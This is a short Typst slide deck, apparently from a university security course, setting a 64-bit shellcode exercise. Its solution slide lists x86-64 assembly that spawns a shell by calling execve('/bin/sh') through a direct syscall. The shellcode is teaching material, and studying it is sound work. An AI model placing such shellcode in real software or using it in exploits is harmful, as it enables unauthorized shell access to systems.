#import "@preview/polylux:0.3.1": *
#import "unipd.typ": *

#new-section[ Task 3 ]
#slide[
  - Repeat task 1.b

  - but with 64 bit
]

#new-section[ Task 3: Solution ]
#slide[
  ```asm
    ; The following code calls execve("/bin/sh", ...)
    xor  rdx, rdx       ; 3rd argument
    push rdx
    mov rax,'#/bin/sh'
    shr rax, 8
    push rax
    mov rdi, rsp        ; 1st argument
    push rdx 
    push rdi
    mov rsi, rsp        ; 2nd argument
    xor  rax, rax
    mov al, 0x3b        ; execve()
    syscall
  ```
]

// TODO: Show stack?

#slide[
  #align(center, v(-10%) + scale(x: 90%, y: 90%, image("exe3.png")))
]

#slide[
  #place(center + horizon, v(18%) + scale(x: 100%, y: 100%, image("obj3.png")))
]
